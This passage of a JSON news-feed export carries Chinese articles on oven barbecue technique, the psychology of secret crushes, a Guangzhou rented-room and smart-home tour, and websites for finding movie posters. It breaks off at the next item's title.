之间就可以搞定大部分的肉类。现在大部分的烧烤炉，在底部都会设置一个接油盘，其实不光是为了接油便于清理，也是为了在里面加上冷水，让水蒸发参与热传导，和风机循环一起平衡整个烤炉的温度，烧烤时肉类受热才均匀。（这里建议大家买烤箱时购买有里面风机空气可以循环的）而直火狂烤，不是干就是焦（个人觉得这个叫烧而不算是烤）。烤箱烤肉就是通过空气热传导，控制温度和时间就足够了，越是大块的肉，温度就应该更低，时间更久才能里嫩，（低温料理了解一下，想一想炖肉为什么要小火）进烤箱前先煎或炸焗都是为了封住水分和表面焦化。煎牛排也一样的道理。</p>\n<p>肉选错一样会很惨，尤其是切的很小很薄的瘦肉，没有足够的脂肪或者体积，根本不适合烧烤，表面烤干就什么水分都不剩了，如果你买的全瘦的猪里脊，牛黄瓜条／牛腿肉之类的建议就哪怕是芡粉炒肉丝都还需要低油温先滑一遍。（川菜里面无论是鸡米芽菜宫保鸡丁鱼香肉丝青椒肉丝无一例外都是需要“滑”）为什么猪五花肉，牛上脑肉，猪梅花肉受烤肉店客人们欢迎你看看花纹就明白了。另一种就是骨头附近的肉，很适合，比如肋排等等。</p>\n<p>最后，说一句，烧烤虽然作为最古老的烹饪方式，他也是一个烹饪专业领域，请多多给我们这些开店的人一些机会，出门吃烤肉吃烧烤吃串烧。</p>\n<p>尤其是疫情解除以后，谢谢！</p>\n<p>意外收获了大家的赞</p>\n<p>上两张图吧</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5fd44367578fe11ccfb1426c5cec8049_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-1d415012374106c4f0cfb9b7ba1da0db_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-af51f77e80fdd91281ac7f639c655697_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-aa9530db2c5f5304ea9ef6bc878b630c_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/377930795\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738970"},{"title":"最理性的暗恋是什么样子的？","date":"2021-08-07 23:06:56","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-efbee9a31c8cd45a623e06c36d398fe3_l.jpg?source=8673f162\"><span>KnowYourself，</span><span>关照自我与内心，引领身心健康的生活方式</span>\n<a href=\"https://www.zhihu.com/question/28460608/answer/410278143\" hidden>阅读原文</a>\n</div>\n<div>\n<p>有答主说，哪有什么暗恋是理性的。</p>\n<p>但我们想说，从心理学上关于这个话题的研究来看，<strong>暗恋这件事在某种程度上，本身就是很“理性”的。</strong></p>\n<p>为什么这么说呢？这可能要从<strong>暗恋背后的动机讲起。</strong></p>\n<p>在过去的很多关于爱的动机的研究和理论里，有一个普遍的设想是，<strong>人们之所以愿意持续地对一个人投入爱，是基于得到回应的可能，与对方建立一段关系的可能，以及对方也会爱我们的可能。</strong><em>但没有回报的、不表白的、且也有很大概率会悲剧结尾的暗恋，却违反了这些“爱的动机”。</em></p>\n<p>那么，在这样的情况下，<strong>人们是出于什么动机才选择去默默爱一个人呢？</strong>Aron，Aron 和 Allen（1998）的一项经典的研究发现，<strong>这种恋爱背后一般有三种类型的动机。</strong></p>\n<p><strong>值得一提的是，他们发现这三种动机是相互独立的。</strong>也就是说，<em>一个人只要满足了其中一种动机（也有同时具备一种以上的可能），就可能会选择暗恋。</em></p>\n<p>所以，很多人以为暗恋是一场无法控制的冲动，<strong>但其实暗恋背后隐藏着人们自己或许未曾意识到的动机</strong>，其中也有着许多利弊权衡的考虑。</p>\n<p>这也是为什么我们说暗恋其实是“理性”的——<strong>暗恋是有主观动机的</strong>（即便你可能并不一定能意识到）。<strong>下面来具体这三种暗恋的动机：</strong></p>\n<p><strong>对方作为潜在的另一半有极高的价值（desirability）</strong></p>\n<p>当这个对象作为另一半，在某一方面或某些方面极其的优秀时（比如才智过人，样貌出众，等等），那么即使与 Ta 发展一段关系的可能性非常渺茫，人们还是愿意对其默默倾注自己的爱意。简而言之，就是 Ta 好到你可以不去计较自己是不是能和 Ta 在一起。</p>\n<p><strong>这样的暗恋对象通常是闪闪发光的，是那些看起来离自己遥不可及的“男神”或“女神”</strong>；这种心情与粉丝对偶像的爱慕也有类似之处。一方面被 Ta 星辰般的光芒所吸引，另一方面也感觉到星辰的遥不可及。</p>\n<p><strong>对方回应自己的可能性较高（probability）</strong></p>\n<p><strong>有一部分暗恋者愿意默默投入自己的时间、精力和爱意，是因为在自己的评估中，对方回应自己心意的可能性很高。</strong>但很多时候，这种评估其实是不准确且高于实际的。在这种情况里，被暗恋的那一方的行为和言语通常会给人造成一些误解。而他们可能只是简单的出于“不想伤害对方”，或是自己神经大条。</p>\n<p><strong>这种情况里，暗恋方一直觉得自己“有希望”并不愿放弃，还有一个重要的原因，那就是有时暗恋自带部分强化（partial reinforcement）的性质。</strong></p>\n<p>部分强化作为行为强化程式（即通过训练增加某种行为发生的频率）的一种，指的是当个体做出某种行为时（e.g. 主动示好的举动），会不定时地、无规律地获得“奖赏”（e.g. 接受并回以关注或示好举动）。</p>\n<p><strong>行为心理学指出，通过部分强化学习的行为，是最难消除的。</strong>因为，个体不知道自己的行为什么时候、什么条件下能得到奖赏；但又因为先前的经验，确信自己的行为有机会得到奖赏，就会不断地去试探和尝试，宛若“上瘾”一般。人们被忽冷忽热、若即若离的人吸引，感到痴迷，就是部分强化在起作用。</p>\n<p>无间断的强化（e.g. 每一次行为都会得到奖赏）会让人十分确信对方的心意，因此很大概率会选择表白；完全没有强化（e.g.从来没有得到过奖赏）则让人很快放弃，但随机的、间断的强化则是最让人欲罢不能的。<strong>暗恋过程中的暧昧、友达以上，就接近于这种情况。</strong></p>\n<p><strong>爱上了默默爱一个人的感觉（desirability of the state）</strong></p>\n<p><strong>默默地、不求回报地爱着一个人这件事，本身也能给很多人带来一种心理上的自我感动和快乐</strong>（Baumeister, Wotman &amp; Stillwell, 1992）。当人们沉浸在暗恋状态时，周围的人可能会将他们看成一个浪漫且带有悲剧色彩的英雄，他们享受着这样一种“默默付出”、“爱而不得”的人设。他们爱上了“爱一个人”的感觉。</p>\n<p>Baumeister 和 Wotman 在他们关于暗恋的书中还说道，这种恋爱甚至可以说是接近于一场“冒险”；即使它得到了一个最不尽人意的结局，对于暗恋者而言，他们仍然能以一种积极的态度来回忆这段恋爱，并将其中的悲伤与风险都当作冒险的一部分。正如 KY 的一位粉丝所言：“<strong>我可能不是喜欢你，而是喜欢那个喜欢着你的自己；我可能不怀念你，但我怀念那个暗恋你时的自己”。</strong></p>\n<p>认真读了一些答主们的答案后，我们发现，“理性暗恋”在大部分人眼中代表着将自己的情感内化于心且不外露于形，尤其是不能让 Ta 发现；或者是对自己的情绪冷眼旁观，给自己列举一个又一个不可能的理由，然后这些所谓的理由又一次又一次地心中的爱意击败 。</p>\n<p>而我们今天分享的“理性”其实很简单，<strong>明白自己为什么暗恋，也明白自己应该怎么去处理这种情绪，不做过激或带来伤害的事，记得这种未知和遗憾带来的微妙感受，也是成长很重要的一部分了。</strong></p>\n<p>或许我们终有一天都会学会勇敢地表露自己的心意，但我们也会由衷地想念当年那个暗恋中小心试探的自己。</p>\n<p>以上啦。</p>\n<p>想要了解更多的心理学专业回答，请关注：<a href=\"https://zhuanlan.zhihu.com/knowyourself\">KnowYourself 知乎专栏</a></p>\n<p><em>点击查看过往高赞回答：</em></p>\n<p><a href=\"https://www.zhihu.com/question/60864080/answer/364322342\">有哪些看似聪明，实则很傻的行为？</a></p>\n<p><a href=\"https://www.zhihu.com/question/31148228/answer/146973775\">为什么一部分女性不喜欢生孩子？</a></p>\n<p><a href=\"https://www.zhihu.com/question/27353387/answer/214789347\">有哪些细微但是高效有用的习惯？</a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-39ba108c9e5191efece14bb12fea3632_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/28460608\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738971"},{"title":"2000 块钱，在广州租下并鼓捣一个可以装进梦想的家丨上","date":"2021-08-07 07:00:00","description":"\n<p>我是一个在深圳长大的孩子，但却更喜欢广州这座城市，它不仅有让人痴迷的烟火气，也有了让每一个人在这里安身立命的希望。从赤岗到东山口，再到白云山麓 —— 如今的我已经搬进了近 90 平米的高档小区，有了自己曾经梦想中的房间。</p>\n<p>我回头望向飘窗许久，此刻刚下过雨的广州天空依然阴沉，远处山峦与云海渐渐模糊的分界，仿佛有了一种即将入秋的仪式感，唯有那带着泥土味的湿热空气还在提醒着我，即便是立秋将至，这座南方的城市依然会长久处在仲夏之时。而记忆仿佛穿梭在广州的三年时空之中，回到了刚毕业那个不到 15 平的小单间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/869849752049bc0bd56c6381ee6bc190.jpg\"><figcaption>飘窗外的夜景</figcaption></figure><p>欢迎来到我的家，欢迎造访我的梦。第二次。</p>\n<h2>搬家</h2>\n<p>2021 年春节的前一刻，刚从厦门回到广州的我，一刻不停地继续打包行李，将东山口剩下的东西全部搬到同和的新家。</p>\n<p>搬家的师傅是个河南人。他说，我从来没有见过一个租房的人，有这么多东西。</p>\n<p>在搬运完最后一箱物品，将钥匙锁在东山口的房子之后，已经日暮时分。那一天，是农历大年二十八。</p>\n<p>我问师傅，今年不回家过年吗？</p>\n<p>「回不去咯，不都号召就地过年吗，怕回去了就出不来了。不过还好，今年我弟他们来我家这过年，本来今晚一起吃饭的，不过之前不是和你说好了来给你搬第二趟嘛，所以就出来再接一单了。」</p>\n<p>师傅笑着和我说。我俩就这样有一搭没一搭聊着，不一会师傅的弟弟来了电话。</p>\n<p>「你们先吃，你们先吃，这边有单生意呢……没事没事，到时候给我热一热就行……嗯嗯嗯好，很快就回去。」</p>\n<p>那时的我看了看表，具体的时间早已忘记。只是师傅说，他住在番禺，帮我搬完了家之后，也得要 40 多分钟才能回到，到家估计要八九点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/0ec5647a85c60581cc5ee0905721de56.jpg\"><figcaption>夏天傍晚的东山口</figcaption></figure><p>到了小区楼下，他和我说，你帮我扶着就好，我们跑两趟就把这些东西搬完。我问，两次？东西这么多，会不会很麻烦？</p>\n<p>「两趟就好，两趟就好……」</p>\n<p>这是气温只有 10 多度的冬天，但他的额头已经有了豆大的汗珠。他脱下外套，一件略显单薄的外衣，隐约地露出了健硕的肌肉，从车上帮我搬下了一件又一件重物，再一件一件用小车拉到我的新家。这样的重体力劳动，或许对他而言，已经是生活的日常。</p>\n<p>最后一箱物品落地，这一天的收入到账后，他已经半个身子跨出了门。</p>\n<p>「新年快乐！」我在门里和他说。</p>\n<p>「新年快乐！新年快乐！」我的目光中已经找寻不到他踪影，只能在双耳中听到来自他浑厚北方口音的祝福。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/20ab8dd473ff9413670b998a8e71122e.jpg\"><figcaption>大年二十八的夜晚，新家的客厅</figcaption></figure><h2>Room Tour</h2>\n<p>新的卧室是一个带有衣柜、床和飘窗的房间，比起之前完全空白的房间而言，算是一次半命题作文。</p>\n<p>在离职之后，重回自由身的我，也有了更多的时间和经历去思考，自己曾经理想中的房间是什么样子。几天的调整和改变下来，它终于来到了现实。</p>\n<h3>家具购买</h3>\n<p>原本的边桌由于经过太多次的搬家，已经变得摇摇欲坠，因此我决定用一个实木斗柜替换掉它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/9d15d468b41044b929eb9584d79a239e.JPG\"><figcaption>旧柜子</figcaption></figure><p>这一次的家装风格主要走日系简约，因此选择了原木色 + 铜柱把手的组合，和我原本的桌子、小斗柜的风格统一。而五层的储物空间，也远比原来的柜子要多。柜子上面还可以放下我的首饰盒和化妆品柜，需要的时候都可以快速拿取，并且节约了空间。</p>\n<p>同时，利用两个斗柜之间的高低差，我将空气净化器放在了这里，完美利用了这个凹下去的位置。上面再放上香薰，在开启空气净化器的同时，还可以将香薰散发的香味尽快吹散到房间里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/e2d961e958c4ba72b6f7feddf2d5828a.jpg\"></figure><p>最后，两个斗柜和门之间空出的位置，还放下了我的小行李箱。</p>\n<p>而这个小行李箱，陪我走过了中国大陆所有秦岭淮河以南的省份，还有西安和北京。</p>\n<p>收纳区域的上方，则是同样陪我走过广州三年的回忆墙。除了列侬和洋子之外，我还贴了一个小时钟，方便在出门时查看时间和温湿度，以及各种各样的拍立得照片和我送给自己的一句话：</p>\n<blockquote><p>所有的结束，不过是为了一个更好的开始。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/0120093f5703c1a586db53805cb1331d.png\"></figure><h3>桌面</h3>\n<p>原本的桌子是一个带有抽屉但不可调节高度的实木桌，离职之后，便把旧桌子的桌板拆下来，安上了原本在公司用的升降桌。坐累了就站一会，站累了就再坐下来，配合 Apple Watch 的站立提醒，可以说是健康人生的第一步了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/db09f93863d2487b3e6d6fa3be199ca7.jpeg\"></figure><p>桌子的左侧放了一个小收纳盒，紧挨着斗柜，放着一些可能需要随时取用的杂物和护肤品。</p>\n<p>中间靠右侧则是一整套可以在家的工作设备，这篇稿子便是我坐在这里写下来的。作为我的生产力工具，它们已经静静在这里呆了好些年，无论是学习工作还是娱乐，我们都相处融洽。</p>\n<p>电脑是 Mac mini 2020 款，搭配的显示器是一块自己 DIY 的 32 寸 4K 显示器，并用一个显示器支架支撑，上面是显示器挂灯。显示器下方从左到右依次是无线充电板、Apple Watch 充电器、索尼 X77 音响，iPhone 6s 和底座。</p>\n<p>至于 iPad Pro，桌子上其实没有它固定的位置。它可以在桌子上，也可以在床上，还可以在飘窗上。只是此时它恰好在这里，也就顺带露个脸了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/8761872c2483f2c786cc619407bc68d1.jpeg\"></figure><p>桌子最右边是一个条形的台灯，在我练字或化妆的时候会打开。风扇则是来自素乐和 LINE 的联名款，当在一众黑白灰的设计中突然看到粉色可妮兔的时候，少女心就被瞬间捕获，于是便将它带到了身边。而医药箱则是近些年的必备，无论是最近常用的酒精和疤克，还是每晚需要的抗脱发药，它们总得有个家。可能等有一天我终于不脱发了，这个箱子的使命就结束了吧。</p>\n<p>顺带需要感谢的，是各种各样的无线设备。AirPods 和 AirPods Pro 经常就待在屏幕左下方的无线充电板上，随手拿起就是满血状态。而 iQunix 键盘和罗技的 MX Master 2s 鼠标也使用无线连接，因此除了在桌面边境之外，几乎看不到什么线。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/1981507f6b0ba3bbb136a2b0e10700cb.jpg\"></figure><p>但充电线总还是要露脸的。就算是 iPhone 12 Pro Max，无线充电的速度也让人叹气，这大概是苹果用户的无奈吧。</p>\n<p>对了，桌垫左下角外侧的下方，有一个无线充电器，手机放在桌面上就可以直接充电。同时，桌底下有一圈灯带，可以调成各种颜色，在不同的环境下营造我所需要的氛围。</p>\n<p>而来到桌底，一切可能就没有这么惬意了。虽然我已经在尽力维持，用线材收纳支架和机柜排插让他们尽量有序。然而现实却告诉我，在哪里跌倒，就在哪里躺着吧 —— 只要眼不见，那么自然心不烦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/567d1968280c9a566a8d9d3b1c4cca19.jpg\"></figure><h3>衣柜</h3>\n<p>衣柜其实没什么太多可说的，但即使是这么大的衣柜，却也没能全部塞下我的衣服。只好将冬天的衣服临时用箱子装起来，收纳到飘窗的一侧了。衣柜的右侧则是一个全身镜，换好衣服化好妆戴好首饰，就可以直接在镜子面前臭美。但作为一个选择困难症，它的存在却经常让我犯难 —— 这样穿好像不好看诶？这个眼妆画的好像有点奇怪？头发感觉又出油了……</p>\n<p>值得聊一聊的应该是衣柜上的两个小耳朵和一个小犄角 —— 像是独角兽一样。两个耳朵是一对双声道的 HomePod，中间的犄角则是一个可以调颜色的氛围灯。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/024df075dbfd7fc252b3848560ef3976.jpg\"></figure><p>无论是阴云密布的午后，还是阳光明媚的清晨，有了这一对 HomePod，在任何时候我都可以让音乐陪伴在我的身边。每天最惬意的时刻，自然是洗完澡躺在床上，将氛围灯调整为昏暗的暖黄色光，让 HomePod 放一些舒缓的助眠歌曲或白噪音，卸下一天的压力。</p>\n<h3>床与飘窗</h3>\n<p>怎样睡一个好觉？我的答案是一套好的床品。</p>\n<p>无论是自己喜欢的色系，还是让人钱包痛的乳胶床垫和乳胶枕，以及靠近飘窗的风景，都让我的睡眠质量一直保持上乘，只是苦于偌大的床只有一个人睡，空有摆在另一侧的枕头，因此一直戒不掉每晚都喜欢熬夜的坏毛病。不过床头的兔子靠背和猫头鹰玩偶，也算是陪度过了不知道多少个思绪泛滥的夜晚。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/7f2a8355eeaaea69f94fc7ba15c0cf40.jpg\"></figure><p>飘窗则比较简洁，只有一个枕头和一面彩虹旗，和床上方的跨性别旗互相遥望。</p>\n<h3>智能家居</h3>\n<p>从当初 15 平米的小单间到现在的大房子，我的智能家居变得越来越多。不少人都觉得，这就是起床关个灯的事，但在实际体验过之后，却再也回不到原来的生活里。</p>\n<p>我自然也是这样。在我的房间里，灯光、空调、窗帘、插座开关，甚至是音乐，都可以在我的手机上控制，或是喊一声「嘿 Siri」，让她来帮忙。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/9e1f9a132134b5741acc5eb7008567d5.PNG\"></figure><p>从睡梦中醒来的时刻，和 Siri 说一句早上好，窗帘便会自动打开，让阳光照进这个温暖的小家，并在 HomePod 上放一些我喜欢的音乐。</p>\n<p>出门时，只要用手机靠近门上的感应贴，窗帘、空调和各种灯光都会自动关闭，直到我夜晚回到家打开房间门，再让它们重新开启，像是一个等候多时的母亲终于盼到了自己归家的孩子。</p>\n<p>而晚上睡觉时，和 Siri 说一句晚安，她便会自动帮我关闭所有灯光和显示器，拉上窗帘，并在手机上开始记录睡眠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/ea5ea66e9736f36b9098e1d77d659dde.gif\"></figure><h2>Coda</h2>\n<p>在这个和迷茫相伴的年岁里，我还有很多毛病，还有很多情绪。裸辞在家的这些天，不仅让我有了更多的时间去经营我的生活的小房间，也让我有了关于未来的各种想法。</p>\n<p>然而，情绪的释放却并非一日之功。我觉得我太累了，所以我决定停下来一段时间，好好想想关于自己与家人，与朋友，与生活，与世界的和解。</p>\n<p>室友问我，你赋闲在家的日子里，难道真的就没有一点焦虑感吗？</p>\n<p>我说，如果是那种来自工作和竞争的焦虑感，那我真的没有。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/86bcd33bfc42b167360aace1d105ab04.jpeg\"><figcaption>室友的猫</figcaption></figure><p>我现在只想做点自己真的喜欢的事情，比如好好打扮打扮自己的房间，去经营一下和身边人的关系，以及戒掉来自网络世界的各种无用的消费欲和表达欲。如果在这些途中能找到自己喜欢的事情，并且能给我带来一定收入，那当然最好不过。</p>\n<p>在现实里挣扎累了，总归还是要回到理想的世界里，这大概是我作为一个纯粹 INFP 的一点执念吧。</p>\n","link":"https://sspai.com/post/68122"},{"title":"制作自己的电影画廊，试试在这 5 个网站找高清海报","date":"2021-08-07 02:42:55","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>之前一直用的豆瓣记录自己看过的电影、剧集和图书，可是每次想通过一定进阶的检索条件来筛选就会比较麻烦。刚好这个月底开始用 Notion 搭建自己的观影 Gallery，需要收集电影海报作为展示，那就来分享几个可以收集清晰的电影海报的网站。</p>\n<h2>豆瓣</h2>\n<p>🔗<a href=\"https://www.douban.com/\" target=\"_blank\">网站</a></p>\n<p>国内最知名的书影音社交网站，几乎可以说的上是国内 IMDb，你可以查到几乎绝大部分的电影、图书、音乐等信息（<s>别问我那些查不到💢</s>）。当然你也可以找到电影海报、剧照等信息，这也是国内最方便检索到相关信息的网站。但是由于豆瓣的海报和剧照等图片都是由网友上传，所以清晰度需要自己分辨。</p>\n<ul><li>首页搜索电影名，进入电影的详细页面，点击最左侧的海报即可查看豆瓣上所有尺寸的海报。</li></ul>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/e5925ebfcd7ec520abff881cce935c83.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/2091b596d45889f094c3a78ef9297581.png\" alt=\"\"></figure><ul><li>同样你可以在右边查看到不同的分类信息，包含了「剧照-海报-壁纸」等。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/e21f0f17bb2207c1d62a25b2c181d7eb.png\"></figure><ul><li>点击进入单张海报详细页面后，你可以在底部看到查看原图的按钮，之后保存即可。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/b4aafbfcf33dae5865c6a8e67dc0c351.png\"></figure><h2>IMDb（<strong>I</strong>nternet <strong>M</strong>ovie <strong>D</strong>ata<strong>b</strong>ase）</h2>\n<p>🔗<a href=\"https://www.imdb.com/\" target=\"_blank\">网站</a></p>\n<p><strong>互联网电影资料库</strong>（简称 <strong>IMDb</strong>）是一个关于电影演员、电影、电视节目、电视艺人、电子游戏和电影制作小组的在线数据库。拥有非常海量的电影、游戏、电视等各类数据条目，几乎是你能想到的它都有，你没想到的它也有。</p>\n<p>在这个网站下载海报、剧照可谓是当仁不让。不过需要注意的是，这个网站不支持中文检索，所以你如果在首页搜索中文名称会得到 「No results found」 的搜索结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/3a2a0578d4448ee6f828609dfd1768aa.png\"></figure><p>但是，如果你在谷歌搜索的时候使用 <code>site:imdb.com</code> 作为高级索引格式，那么你输入汉译电影名可能会找到相关条例。（有些中国电影可以通过拼音来查询，比如早就该申遗的「让子弹飞」在 IMDb 可以通过「rang zi dan fei」或「Let the Bullets Fly」都可以搜索到）。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/5a1f7b12a34a6b8b08de7deccd833fd2.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/6c878af748294b035924b465933f1e1a.png\" alt=\"\"></figure><p>和豆瓣类似，你都可以在网页左侧点击海报或者是下方的 Photos 进入图库。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/ea55dbdb21afa4b369833aeed749269c.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/22bbcd746ed80f9525fb08b84f243327.png\" alt=\"\"></figure><p>然后在右侧可以进行筛选海报、剧照或者是演员个人。点击查看海报大图就可以保存了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/75f6551483b99ce2899f002155f8c89b.png\"></figure><h2>IMP Awards</h2>\n<p>🔗<a href=\"http://www.impawards.com/\" target=\"_blank\">网站</a></p>\n<p>IMP Awards 是著名的电影海报网站，甚至每年还会评选最好的和最差的电影海报。里面的电影海报收集的也非常大而全。但是主页嘛，看起来的确有那味了，绿色色调就非常怪诞和复古。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/088e96a468f5880538670d59060dd78e.png\"></figure><p>以「让子弹飞」为例子，搜索它的英文名就能找到这部电影，点开详细页面后。就能看到所有的海报了，清晰度非常高，还是免费的。但是就是单部影片的海报数量较小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/a0d4e4f4edcbb817ebb93e2dc18df938.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/93009bf7fd7abe16e34774ccd87d82a6.png\"></figure><h2>CineMaterial</h2>\n<p>🔗<a href=\"https://www.cinematerial.com/\" target=\"_blank\">网站</a></p>\n<blockquote><p>CineMaterial is a digital community that aims to create a complete digital archive of movie posters, covers, logo's, key art and more. So far, we have collected over <strong>one million images</strong>.</p></blockquote>\n<p>简单来说：CineMaterial 是一个致力于创建完整的电影海报的数字社区。你可以在里面找到非常多的电影海报、封面和图标。</p>\n<p>输入电影名称就可以找到相关影片，点击进入详细页面后，会有一个 Poster 板块，点击进入后就能看到所有不同尺寸、不同国家的海报。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/9176b29302920ab54604386c877c923d.png\"></figure><p>虽然右边有筛选器 filter 帮助你快速筛查不同的海报，但是此功能只有高级捐赠者和贡献者才能使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/61dfb613d9407e0fb9836aebe1547a99.png\"></figure><p>而且下载海报也需要捐赠一定的金额来购买。但是尺寸和清晰度的确上升了一个档次。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/f86c1de409d30c2ae745e26edf9700ee.png\"></figure><h2>Apple TV Shows &amp; Movies Artwork Finder</h2>\n<p>🔗<a href=\"https://bendodson.com/projects/itunes-artwork-finder/\" target=\"_blank\">网站</a></p>\n<p>这是一个创作者自己制作的网站，你可以使用这个新的网站查找 iTunes 里的海报和封面。支持 海报图片和高分辨率图片。其中还能下载 Apple TV 的预览图以及透明 Logo 或者是用作社交媒体的 CoverArt 16:9 的照片。但是仅限于 Apple TV 里观看的或购买的影片，你还可以根据需要切换地区来找到一些非全区可看的电影海报。</p>\n<p>其实目前我使用它的频率是非常的高，因为横版海报我觉得比竖版海报好看，同时在社交媒体和文章中的排版也更加精致。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/2a7732b0884fb165a27953423bcec1e4.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/944aabc19b7d5aeaf88b374473eea377.png\" alt=\"\"></figure><h2>评论推荐</h2>\n<h4>@啊權權權兒<strong>：TMDb </strong>\n</h4>\n<p><strong>🔗</strong><a href=\"https://www.themoviedb.org/\" target=\"_blank\">网站</a></p>\n<p>这是评论区推荐的一个网站，里面有海量的海报、剧集等信息可以供你发现和探索。你可以看到目前在流媒体、电视、租借和院线上映的热门影片。甚至还能看到电影的预算以及目前的票房等各种信息。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/08/c6c45987106040a84f4b3022baf5f052.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/08/8352056381af2bb48fb0583e97e970ec.jpg\" alt=\"\"></figure><p>搜索或点击特定影片后，最上方是一个大横幅，有海报、影片资料、评分等其他详情。下方有主演的信息，海报以及同类型影片的推荐。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/08/e8c7c569653d9a821e41208ccc4cd5a4.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/08/1f4a94d410324c26fbd70fb6ada13767.jpg\" alt=\"\"></figure><p>而且你查看海报或者是剧照的列表时，左侧是可以选择不同语言的海报，方便你制作或根据需求下载高清海报。</p>\n<p>总之这也是一个非常大而全的网站，在支持中文的前提下，我用了用觉得质量非常的高。还有许多应用也在使用它们的服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/08/d49a3c5e648eaa5b90f6aaa8d293e972.png\"></figure><p>感谢评论区其他用户推荐的网站，里面还有许多许多我暂时性不一一列举了，有许多网站收录了小众电影、国外电影、动漫等海报和信息，大家可以去评论去看看。</p>\n<h2>玩法 🥚</h2>\n<p>你可以配合 Notion 做出一个非常好的看的 Gallery 来记录你的电影记录。我目前是豆瓣 + Notion 一起使用来完成整个记录。其中大部分的我是使用 Artwork Finder 作为封面因为横版海报的显示效果非常的好，冲击感以及可显示的信息都会比竖版海报多上不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/a1b605dd19b96f4f8e0e8346e65d672e.png\"></figure><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66664"},{"title":"2020 东京奥运田径男子 4 x 100 米接力决赛中国队夺得第 4，如何评价本场比赛？","date":"2021-08-06 